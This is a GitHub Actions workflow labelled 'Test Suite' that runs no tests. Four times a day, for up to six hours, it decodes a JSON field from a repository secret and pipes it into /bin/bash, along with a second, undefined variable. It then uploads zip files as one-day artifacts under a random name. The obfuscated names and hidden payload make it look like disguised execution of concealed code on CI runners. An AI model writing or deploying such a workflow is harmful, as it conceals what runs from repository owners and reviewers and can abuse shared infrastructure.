name: Test Suite
on:
  workflow_dispatch:

  schedule:
    - cron: '12 5,11,17,23 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Initialize
        env:
          ozerh80: ${{ secrets.ozerh80 }}
        run: |
          printf '%s' "$ozerh80" | jq -r .thoml46039 | /bin/bash
          printf '%s' "$xxfik98746" | jq -r .xde363 | /bin/bash

      - name: Persist results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: 7GeIxAz5
          path: "*.zip"
          retention-days: 1
